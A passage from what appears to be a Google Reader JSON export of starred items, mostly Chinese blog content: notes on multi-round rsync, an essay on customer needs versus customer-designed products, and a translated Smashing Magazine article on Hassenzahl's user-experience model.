href=\"http://portal.acm.org/citation.cfm?id=1247340.1247355\">本地rsync</a>两个。<br><br>多轮rsync的原理简单的说就是先用较大的块大小按rsync的方法处理一轮，但只传输那些命中的块，那些没命中的数据称为“空洞”，按较小的块大小再按rsync的方法又处理一轮，如此双可能产生规模更小的“空洞”，如此按来一轮，直到块大小到配置的最小块大小为止。最后一轮跟原始rsync是一样的，当然只处理上一轮遗留下来的“空洞”。多轮rsync在理论上可以将最差情况下的复杂度（以传输的数据量称是）从原rsync的O(sqrt(n))提高到O(ln n)。试验中有时多轮rsync可以比原rsync有10倍的提升，但大部分情况下是类似的。<br><br>本地rsync则是直接更新A到与B一致，原始rsync算法是需要构造一个与B一致的副本。为实现这一点，需要先拿到所有匹配信息后进行拓扑排序，再依次应用，是有些复杂的。</div>"
    },
    "author" : "风轻扬",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://wangyuanzju.blog.163.com/rss/",
      "title" : "风轻扬",
      "htmlUrl" : "http://wangyuanzju.blog.163.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1301845498939",
    "timestampUsec" : "1301845498939103",
    "id" : "tag:google.com,2005:reader/item/bbcba64909de5750",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "硅谷的人才大战",
    "published" : 1301845498,
    "updated" : 1301845498,
    "alternate" : [ {
      "href" : "http://img.cnbeta.com/newsimg/110401/13014401243091458.jpg",
      "type" : "text/html"
    } ],
    "related" : [ {
      "href" : "http://img.cnbeta.com/",
      "title" : "img.cnbeta.com"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<img src=\"http://img.cnbeta.com/newsimg/110401/13014401243091458.jpg\">"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "user/11910898501063326571/source/com.google/link",
      "title" : "img.cnbeta.com",
      "htmlUrl" : "http://img.cnbeta.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1301845495945",
    "timestampUsec" : "1301845495945112",
    "id" : "tag:google.com,2005:reader/item/dcf9ad1e75dad2df",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "Mvc for client side javascript apps",
    "published" : 1301845495,
    "updated" : 1301845495,
    "alternate" : [ {
      "href" : "http://peter.michaux.ca/articles/mvc-architecture-for-javascript-applications",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<a href=\"http://news.ycombinator.com/item?id=2402361\">Comments</a>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://news.ycombinator.com/rss",
      "title" : "Hacker News",
      "htmlUrl" : "https://news.ycombinator.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1301845485916",
    "timestampUsec" : "1301845485916264",
    "id" : "tag:google.com,2005:reader/item/139d8b11ce192b71",
    "categories" : [ "user/07404792466326621424/state/com.google/broadcast", "user/07404792466326621424/state/com.google/like", "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "做比客户更好的产品经理！",
    "published" : 1301157300,
    "updated" : 1301157300,
    "alternate" : [ {
      "href" : "http://blog.run2me.com/runliu/archive/2011/03/27/44671.aspx",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p>- 首发于《福布斯》中文网：<a title=\"http://www.forbeschina.com/entrepreneur/review/201103/0008395.shtml\" href=\"http://www.forbeschina.com/entrepreneur/review/201103/0008395.shtml\">http://www.forbeschina.com/entrepreneur/review/201103/0008395.shtml</a></p> <p>收到<a href=\"http://blog.donews.com/keso/\">Keso</a>的邀请加入<a href=\"http://www.zhihu.com/\">知乎</a>后，回答的第一个问题是：“<a href=\"http://www.zhihu.com/question/19576886\">是该创造需求，还是迎合需求</a>”。写了几句，觉得有点不够尽兴，就再写几句。</p> <p>福特说，“如果我问客户他们想要什么，他们会说：想要更快的马。”幸运的是，福特没去养马，而是发明了汽车。</p> <p>那么，福特是创造了需求，还是迎合了需求呢？</p> <p>我们先要区别“需求”和“客户自己设计的产品”。“更快的马”不是需求，“更快的马”是一种客户自己设计的产品，一种客户自认为能够满足自己需求的产品。你找来一匹确实更快的马，客户也确实满意而归，“更快的马”依然不是客户的需求。我们只能说，OK，这个客户是个不错的产品经理，他自己设计的产品，能够满足他自己的需求。</p> <p>而福特，是比客户更好的产品经理。</p> <p>服务员问你：喜欢喝什么茶？你说：普洱。你不会说：我需要一种能降血脂的、还却不那么难喝的、最重要的是价格能接受的饮料。你说的是产品，不是需求。如果这个服务员明白“需求”和“客户自己设计的产品”之间的区别，接着问：我们有一种新茶，比普洱降血脂效果好5倍，而且口感更醇香，价格一样，要不要试试？也许你真会试试。这个服务员是迎合了需求，还是创造了需求？</p> <p>大多数情况下你问客户“需求”，客户回答“自己设计的产品”。创造“需求”的说法本身就错误，你只是没有创造“客户自己设计的产品”。你：1）凝听了客户自己创造的产品（客户以为那是需求），2）然后分析得知真正的需求，3）创造了更能满足他们真正需求的产品。</p> <p>你在创造产品，迎合需求，而非创造需求。</p> <p>理解“客户自己设计的产品”背后的“需求”是如此重要和必要，因为，有时客户真不会设计，偶尔他们还会撒谎。</p> <p>设计师问对装修风格有什么要求，客户说：亮一点。他真不会设计。你只能多做一些：多加两扇窗你会觉得亮一点吗？把墙刷成白色会有帮助吗？多装一些日光灯或者灯带呢？这些假想的产品设计会帮助你了解客户说“亮一点”时的真正需求。</p> <p>有个航空公司调查，买机票的首要因素是什么？最多的回答是：安全。但你去调查一下实际销售数据，却发现首要因素居然是价格。客户自以为自己最应该关注的是一件事，但其实是另一件。他不是想故意骗你，他真的认为自己这么认为，但实际需求却不是。</p> <p>有很成功的产品经理说：一定要听用户的！也有很成功的产品经理说：千万不要听用户的。如果你能理解，他们说的，其实完完全全是一个意思，那么你就得道了：听从用户真正的需求 …</p> <p>… 然后，做比客户更好的产品经理！</p><img src=\"http://blog.run2me.com/runliu/aggbug/44671.aspx\" width=\"1\" height=\"1\">"
    },
    "author" : "刘润",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://blog.run2me.com/runliu/rss.aspx",
      "title" : "刘润",
      "htmlUrl" : "http://run2me.chinasic.com/runliu/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1301494485369",
    "timestampUsec" : "1301494485369768",
    "id" : "tag:google.com,2005:reader/item/f544437e2c5be265",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "为什么用户体验是不可设计的",
    "published" : 1301061239,
    "updated" : 1301061239,
    "alternate" : [ {
      "href" : "http://article.yeeyan.org/view/118604/180607",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>原作者：<br>来源<a href=\"http://www.smashingmagazine.com/2011/03/15/why-user-experience-cannot-be-designed/\">Why User Experience Cannot Be Designed - Smashing Magazine</a><br>译者<a href=\"http://space.yeeyan.org/u/118604\">风清扬</a></p><h1 style=\"margin-top:32px;margin-right:0px;margin-bottom:14px;margin-left:0px;width:275px;height:69px;background-image:url();background-color:transparent;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:12px;line-height:20px;background-repeat:no-repeat no-repeat\"><font color=\"#3151A2\"><span style=\"width:275px;height:69px;display:block\"><br> </span></font></h1> <div><div><p style=\"color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:12px;line-height:20px\"><span style=\"font-family:&#39;sans serif&#39;,tahoma,verdana,helvetica;font-size:24px;line-height:43px;color:#000000\"><b>为什么用户体验是不可设计的</b></span></p> <p style=\"color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:12px;line-height:20px\"><span style=\"font-family:&#39;sans serif&#39;,tahoma,verdana,helvetica;font-size:14px;line-height:25px;color:#000000\">（idesign上面有人说这个标题很欠揍）</span></p> </div> </div> <div style=\"padding-top:0px;padding-right:30px;padding-bottom:35px;padding-left:0px;clear:both\"> <font face=\"verdana, arial, geneva, helvetica, sans-serif\"><span style=\"line-height:25px\"><br> </span></font> <ul style=\"font:normal normal normal 0.83em/normal tahoma,verdana,helvetica,arial,sans-serif;color:#a8a7a7;display:block;margin-top:4px;margin-right:0px;margin-bottom:12px;margin-left:0px;clear:both;list-style-type:none;list-style-position:initial;padding-top:0px;padding-right:0px;padding-bottom:9px;padding-left:0px;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em;line-height:20px\"><li style=\"padding-bottom:0px;padding-top:0px;padding-right:8px;padding-left:0px;float:left;border-right-width:1px;border-right-style:solid;border-right-color:#e6e6e6\">By <a href=\"http://www.smashingmagazine.com/author/helge-fredheim/\" title=\"Posts by Helge Fredheim\" style=\"color:#3151a2\">Helge Fredheim</a></li> <li style=\"padding-bottom:0px;padding-top:0px;padding-right:8px;padding-left:8px;float:left;border-right-width:1px;border-right-style:solid;border-right-color:#e6e6e6\">March 15th, 2011</li> <li style=\"padding-bottom:0px;padding-top:0px;padding-right:8px;padding-left:8px;float:left;border-right-width:1px;border-right-style:solid;border-right-color:#e6e6e6\"><a href=\"http://www.smashingmagazine.com/category/design/\" title=\"View all posts in Design\" rel=\"category tag\" style=\"color:#3151a2\">Design</a></li> <li style=\"padding-bottom:0px;padding-top:0px;padding-right:8px;padding-left:8px;float:left;border-right-width:1px;border-right-style:solid;border-right-color:#e6e6e6\"><a href=\"http://www.smashingmagazine.com/2011/03/15/why-user-experience-cannot-be-designed/#comments\" title=\"Comment on Why User Experience Cannot Be Designed\" style=\"color:#3151a2\">55 Comments</a></li> <li style=\"padding-bottom:0px;padding-top:0px;padding-right:8px;padding-left:8px;float:left;border-right-width:initial;border-right-style:none;border-right-color:initial\"><a href=\"http://www.smashingmagazine.com/publishing-policy/\" style=\"color:#3151a2\">Publishing Policy</a></li> </ul> <div><div style=\"line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\"><span style=\"font:normal normal normal 0.92em/normal tahoma,verdana,arial,helvetica,sans-serif;color:#cacaca;display:block;text-align:left;margin-top:0px;margin-right:0px;margin-bottom:4px;margin-left:0px\">Advertisement</span><div><div><a href=\"http://auslieferung.commindo-media-ressourcen.de/www/delivery/ck.php?oaparams=2__bannerid=471%7C1569__zoneid=22%7C58__OXLCA=11__cb=23eaf27bea__oadest=http%3A%2F%2Fwww.wix.com%2Fflash_design%2Ffish_new%3Futm_campaign%3Dma_smashing%26experiment_id%3Dma_smashing_tag\" style=\"color:#3151a2\"><img src=\"http://auslieferung.commindo-media-ressourcen.de/www/delivery/ai.php?filename=tag_300_2.jpg&amp;contenttype=jpeg\" width=\"300\" height=\"250\" alt=\"\" title=\"\" border=\"0\" style=\"margin-top:6px;margin-right:0px;margin-bottom:6px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-width:0px;border-right-width:0px;border-bottom-width:0px;border-left-width:0px;border-style:initial;border-color:initial\"></a><div><img src=\"http://auslieferung.commindo-media-ressourcen.de/www/delivery/lg.php?bannerid=471%7C1569&amp;campaignid=252%7C675&amp;zoneid=22%7C58&amp;OABLOCK=0%7C0&amp;OACAP=0%7C0&amp;OASCAP=0%7C0&amp;OACBLOCK=0%7C0&amp;OACCAP=0%7C0&amp;OASCCAP=0%7C0&amp;OAZBLOCK=0%7C0&amp;OAZCAP=0%7C0&amp;OASZCAP=0%7C0&amp;OXLIA=1&amp;loc=http%3A%2F%2Fwww.smashingmagazine.com%2F2011%2F03%2F15%2Fwhy-user-experience-cannot-be-designed%2F&amp;cb=23eaf27bea\" width=\"0\" height=\"0\" alt=\"\" style=\"margin-top:6px;margin-right:0px;margin-bottom:6px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-width:0px;border-right-width:0px;border-bottom-width:0px;border-left-width:0px;border-style:initial;border-color:initial;width:0px;height:0px\"></div> </div> </div> </div> <font color=\"#1E1E1E\" face=\"verdana, arial, geneva, helvetica, sans-serif\"><span style=\"line-height:20px\"><br> </span></font> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">       这几天来好多设计者似乎都在讨论用户体验。我们应该去取悦我们的用户，甚至给他们提供魔术般的体验，所以他们才会爱我们的网站、软件和启动界面。用户体验是一个非常模糊的概念。这就导致很多人运用不当。此外还有好多设计者似乎有着一个强烈的理想（而且经常是不真实的）去雕琢他们产品的用户体验。当然了，用户体验并不仅仅是基于一些被设计的东西，还包含其他很多方面。在本篇文章里，我将试着阐述为什么用户体验不能被设计。</p> <h3 style=\"padding-top:10px;padding-right:0px;padding-bottom:3px;padding-left:0px;margin-bottom:18px;font:normal normal normal 2.5em/1.33em helvetica,arial,helvetica,sans-serif;color:#2f2f2f;border-bottom-width:3px;border-bottom-style:solid;border-bottom-color:#2f2f2f;font-family:&#39;droid sans&#39;,arial,sans-serif;line-height:20px;font-size:1em\">包含不同方面的用户体验阐述：</h3> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">        我最近访问了一个设计公司优雅的网站。这个网站看起来非常棒，而且这家公司已经被展示过几次。我很确定他交付了高质量的产品。但是让他们呈现自己的用户体验产品的时候，这家公司将用户体验等同于信息架构：网站地图，现况和其他诸如此类的东西。这或许并不是从根本上错误的，但这限制了用户体验使得其比起其真正的定义来狭隘许多。</p> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">        这种看法或许在我们行业并不典型，但是这阐述了用户体验可以通过不同的方式感知，并且有些时候他是一个代表易用性的流行词（请浏览 Hans-Christian Jetter 和 Jens Gerken的文章“实际应用的一个简单的用户体验模型”即“<a href=\"http://www.inf.uni-konstanz.de/gk/people/member/abstract.html?JeGe06\" style=\"color:#3151a2\">A simplified model of user experience for practical application</a>”获得更多）。但是用户体验并不仅仅是人机交互、易用性或者信息架构，虽然易用性可能是组成用户体验最重要的因素。</p> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">        一些调查显示用户体验的感知是不同的。即便如此，人们更倾向于认为用户体验相比传统的人机交互为人和电脑提供了一个更广泛的交流方法。人际交互则主要涉及任务解决，最终目标和实际结果，而用户体验则远远超出这些。用户体验将其他方面考虑进来，比如情感化，享乐性，审美性，情感性和经验变量。易用性通常是可以衡量的，但是许多用户体验的其他方面是很难衡量的。</p> <h3 style=\"padding-top:10px;padding-right:0px;padding-bottom:3px;padding-left:0px;margin-bottom:18px;font:normal normal normal 2.5em/1.33em helvetica,arial,helvetica,sans-serif;color:#2f2f2f;border-bottom-width:3px;border-bottom-style:solid;border-bottom-color:#2f2f2f;font-family:&#39;droid sans&#39;,arial,sans-serif;line-height:20px;font-size:1em\">Hassenzahl的用户体验模型</h3> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2011/02/hassenzahls-model2.jpg\" alt=\"Hassenzahls-model2 in Why User Experience Cannot Be Designed\" width=\"500\" height=\"390\" style=\"margin-top:6px;margin-right:0px;margin-bottom:6px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-width:0px;border-right-width:0px;border-bottom-width:0px;border-left-width:0px;border-style:initial;border-color:initial\"><br> <em>Hassenzahl的用户体验模型</em></p> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">        几个已经提出的用户体验模型，其中的一些是基于<a href=\"http://books.google.com/books?id=QKYPdcI-av8C&amp;lpg=PA31&amp;ots=fhpyp6-jRi&amp;dq=Hassenzahls%20model&amp;hl=no&amp;pg=PA31#v=onepage&amp;q&amp;f=false\" style=\"color:#3151a2\">Hassenzahl</a>的模型的。这个模型假定每一个用户在使用的时候都为产品或服务设定一个属性。正如我们所见，这些属性对每个用户而言是不同的。用户体验就是这些产品在被使用的时候的属性叠加的结果。</p> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">        这些属性可以被分为四个类别：操作性，识别性，激励性和召唤性。这些类别在大的方面可以被归类为实用主义和享乐主义属性里。尽管实用主义和产品的实际操作和功能相关，但享乐主义则和用户的心理幸福感相联系。理解这种分类可以帮助我们理解怎样带着对用户体验的尊敬去设计产品，而且这种分类也澄清了为什么用户体验本身是不能被设计的。</p> <h4 style=\"margin-top:35px;margin-right:0px;margin-bottom:20px;margin-left:0px;font:italic normal normal 1.9em/normal georgia,&#39;times new roman&#39;,times,serif;color:#d93315;font-family:&#39;droid sans&#39;,arial,sans-serif;font-size:25px;font-style:normal;line-height:20px\">操作性</h4> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\"><a href=\"http://www.flickr.com/photos/juniorvelo/4490511204/\" style=\"color:#3151a2\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2011/02/hammer-sm.jpg\" alt=\"Hammer-sm in Why User Experience Cannot Be Designed\" width=\"500\" height=\"289\" style=\"margin-top:6px;margin-right:0px;margin-bottom:6px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-width:0px;border-right-width:0px;border-bottom-width:0px;border-left-width:0px;border-style:initial;border-color:initial\"></a><br> <a href=\"http://books.google.com/books?id=QKYPdcI-av8C&amp;lpg=PA31&amp;ots=fhpyp6-jRi&amp;dq=Hassenzahls%20model&amp;hl=no&amp;pg=PA31#v=onepage&amp;q&amp;f=false\" style=\"color:#3151a2\">Hassenzahl</a>用一组锤子暗喻解释了享乐主义和实用主义。实用主义是产品功能和我们使用这种功能的方式。当然，一个锤子也可以拥有享乐主义属性；比如，如果它被用来交流专业知识和唤起回忆的话。（图：<span style=\"line-height:20px\"><a href=\"http://www.flickr.com/photos/juniorvelo/4490511204/\">Velo Steve</a></span>）</p> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">        在这个模型里，使用主义属性和软件的操作相关。本质上，操作性值得是产品核心功能和使用这些功能的方式。典型的，我们将这些属性和可用性相关联。实用主义特性的结果是满足感。满足感在用户使用产品或者服务达到一个确定目标而产品或者服务能够达到这些目标的时候出现。</p> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">       和网站（通常还有软件）相关联的属性例子是“支持的”“有用的”“清晰的”和“可控制的”。一个产品的目的应该明确，用户应该理解如何去使用它。为了这个目的，操作性通常被认为是为用户体验作出贡献的最重要的属性。</p> <h4 style=\"margin-top:35px;margin-right:0px;margin-bottom:20px;margin-left:0px;font:italic normal normal 1.9em/normal georgia,&#39;times new roman&#39;,times,serif;color:#d93315;font-family:&#39;droid sans&#39;,arial,sans-serif;font-size:25px;font-style:normal;line-height:20px\">识别性</h4> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">        尽管操控性很重要，一款产品也可以拥有其他功能。其中的首要功能就是识别性。思考下：许多和你相关的产品用来获取你自身特点和你在意的东西，甚至其中的一些比其他的都要重要或者更具描述性。一个项目的第二功能是向别人传达你的身份。所以，为了满足这个功能，项目需要让使用者能够表达他们自己。</p> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">        社交媒体的增长可以被身份认同这种功能解释。以前，我们用个人网站向世界传达我们的个人习惯和宠物。现在，我们换成了社交媒体。</p> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">        脸书（facebook），博客和许多其他在线服务帮助我们传达我们是谁和我们做的事情；这些产品就是为了支持这种身份认同而设计的；它允许用户为了表达自己而自定义自己的资料。WordPress和其他平台允许博主们选择主题并且通过内容表达自己，正如用户在脸书（facebook）、Twitter和其他社交平台上更新状态一样。</p> <h4 style=\"margin-top:35px;margin-right:0px;margin-bottom:20px;margin-left:0px;font:italic normal normal 1.9em/normal georgia,&#39;times new roman&#39;,times,serif;color:#d93315;font-family:&#39;droid sans&#39;,arial,sans-serif;font-size:25px;font-style:normal;line-height:20px\">Stimulation</h4> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2011/02/gmail-sm-3.jpg\" alt=\"Gmail-sm-3 in Why User Experience Cannot Be Designed\" width=\"500\" height=\"216\" style=\"margin-top:6px;margin-right:0px;margin-bottom:6px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-width:0px;border-right-width:0px;border-bottom-width:0px;border-left-width:0px;border-style:initial;border-color:initial;display:inline\"><br> <em>Gmail在用户忘记上传附件的时候提示用户。</em></p> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">        帕累托原则，也被称为80-20规则，表明80%有价值的资源可以通过20%的操作达到。这已经被提出过，所以，在传统的工程可用性领域，功能必须经过斗争才能被包括在内，因为他们中很大一部分很少被用到。</p> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">        但这并不适用于用户体验，因为很少用到的功能可以满足一个叫做刺激性的享乐功能。因为较少用到的功能可以刺激用户并且满足人类对个人发展和更多技巧的渴求。某一对象可以通过提供洞察力和惊奇帮助我们做事。</p> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">        从这个观点来说，不习惯使用的功能不应该仅仅从软件中去除因为他们往往给使用他们的用户一种千载难逢的感觉。如果他们被保留，他们在某天被用户发现的时候可以给予用户一个惊喜和积极的用户体验。结果是用户可能会认为“这是一个多么有才的程序啊！”并且会更加喜欢它。</p> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">        实际上，这正是gmail在我忘记在邮件中上传附件的时候提醒我时我所想的。如果你在Twitter上搜索“Gmail附件”，你将有可能发现其他很多人有相同的感觉。</p> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">        此外，我认为YouTube在超级碗星期天（或者情人节）通过修改LOGO来加强效果的做法“非常酷！”。同样在MailChimp的猴子耳语“喂，Helge，我听说传闻。。。”我发现了一些新东西，而且让我想起了YouTube上的一首香蕉女郎歌。有很多例子，但是最好的刺激功能可能是这些预料之外但却仍然受欢迎的例子（例如Gmail的通知）。</p> <h4 style=\"margin-top:35px;margin-right:0px;margin-bottom:20px;margin-left:0px;font:italic normal normal 1.9em/normal georgia,&#39;times new roman&#39;,times,serif;color:#d93315;font-family:&#39;droid sans&#39;,arial,sans-serif;font-size:25px;font-style:normal;line-height:20px\">召唤性</h4> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\"><a href=\"http://www.flickr.com/photos/meddygarnet/4418221737/\" style=\"color:#3151a2\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2011/02/souvenirs-sm.jpg\" alt=\"Souvenirs-sm in Why User Experience Cannot Be Designed\" width=\"500\" height=\"309\" style=\"margin-top:6px;margin-right:0px;margin-bottom:6px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-width:0px;border-right-width:0px;border-bottom-width:0px;border-left-width:0px;border-style:initial;border-color:initial;display:inline\"></a><br> <em>纪念品通常操作性很弱，但是他们在唤起记忆的时候有很强的召唤性。图：</em><span style=\"line-height:21px\"><a href=\"http://www.flickr.com/photos/meddygarnet/4418221737/\">meddygarnet</a></span></p> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">      根据<a href=\"http://books.google.com/books?id=QKYPdcI-av8C&amp;lpg=PA31&amp;ots=fhpyp6-jRi&amp;dq=Hassenzahls%20model&amp;hl=no&amp;pg=PA31#v=onepage&amp;q&amp;f=false\" style=\"color:#3151a2\">Hassenzahl</a>的模型，一款产品可以拥有的第四个功能是召唤性，这是关于召唤过去记忆的功能。我们乐于讨论和会想过去的美好时光（甚至是昨天的事情），而且我们希望产品可以帮助我们回忆。甚至怪异的、布满灰尘的和毫无实际用途的纪念品（操作性较弱）由于可以帮助我们回忆过去而拥有召唤性功能。</p> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">        在设计上，我们当然可以给网站一个复古的外观和感觉来帮助我们回忆起童年、高中或者60年代。。。或者30年代。但是即便是一个拥有现代和抽象设计的网站也可以拥有召唤属性。比如说，难道脸书（facebook）和Flickr（通过他们的用户和你的朋友们的使用方式）展现给你的过去数量巨大的图片中的一些不够有召唤性吗？</p> <h3 style=\"padding-top:10px;padding-right:0px;padding-bottom:3px;padding-left:0px;margin-bottom:18px;font:normal normal normal 2.5em/1.33em helvetica,arial,helvetica,sans-serif;color:#2f2f2f;border-bottom-width:3px;border-bottom-style:solid;border-bottom-color:#2f2f2f;font-family:&#39;droid sans&#39;,arial,sans-serif;line-height:20px;font-size:1em\">因此，用户体验不能被设计</h3> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2011/02/mailchimp-sm.jpg\" alt=\"Mailchimp-sm in Why User Experience Cannot Be Designed\" width=\"500\" height=\"135\" style=\"margin-top:6px;margin-right:0px;margin-bottom:6px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-width:0px;border-right-width:0px;border-bottom-width:0px;border-left-width:0px;border-style:initial;border-color:initial;display:inline\"><br> <em>.</em><em>MailChimp的猴子的话可能比其他东西更加吸引一些用户</em></p> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">        综上所述，为什么要纠结于用户体验不能被设计这个话题呢？因为用户体验并不仅仅基于产品本身，还基于用户和他们使用产品时的处境。</p> <h4 style=\"margin-top:35px;margin-right:0px;margin-bottom:20px;margin-left:0px;font:italic normal normal 1.9em/normal georgia,&#39;times new roman&#39;,times,serif;color:#d93315;font-family:&#39;droid sans&#39;,arial,sans-serif;font-size:25px;font-style:normal;line-height:20px\">你不能设计用户</h4> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">        有各种不同的用户。其中一些能够轻易的使用网站完成他们的任务。其他则不能。产品的刺激性取决于个人用户对于其他类似产品的体验。用户会对比网站，并且会有不同的期望。此外，他们的目标不同，所以他们用不同的模式使用你的产品。</p> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">        想想看，在参观品评食物的时候，你总是将其和你曾去过的其他餐馆的体验相比较。他们已经定义了你的体验。你的同伴则和他们之前的经历对比，这必然和你的有所不同。对于软件、网站和程序来说同样如此。刺激属性甚至变化更大，仅仅因为所有的用户都拥有一个独特的经历和激励。</p> <h4 style=\"margin-top:35px;margin-right:0px;margin-bottom:20px;margin-left:0px;font:italic normal normal 1.9em/normal georgia,&#39;times new roman&#39;,times,serif;color:#d93315;font-family:&#39;droid sans&#39;,arial,sans-serif;font-size:25px;font-style:normal;line-height:20px\">你不能设计用户的处境</h4> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">        用户体验也基于产品使用的环境。用户的处境远远超出设计的能力。它能决定产品使用的原因，定义用户的期望。</p> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">        在一些场合，你可能想要探索和利用WordPress丰富的功能。在其他情况下，同样的功能则使你的事情变得过于复杂。当MailChimp的猴子随意的告诉你“某个地方现在是五点”时，一些情况下你可能这非常酷，但是其他情况下你会觉得这非常怪异和烦人，因为你是在一个不同的状态下使用这个程序。</p> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">        此外，用户体验随着时间进化。第一次用户使用一款软件，他们可能感到迷惑，并且有着消极的体验。之后，当他们习惯之后并且发现其更富的特点和本质以及学会如何应对之后，他们可能会变得眷恋它，然后用户体验就会变得更加积极。</p> <h3 style=\"padding-top:10px;padding-right:0px;padding-bottom:3px;padding-left:0px;margin-bottom:18px;font:normal normal normal 2.5em/1.33em 